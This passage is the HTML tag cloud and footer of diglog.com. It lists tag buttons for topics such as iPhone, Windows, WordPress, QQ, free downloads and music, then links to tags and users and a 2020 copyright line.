btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy; 2020 diglog.com </div></div></body></html>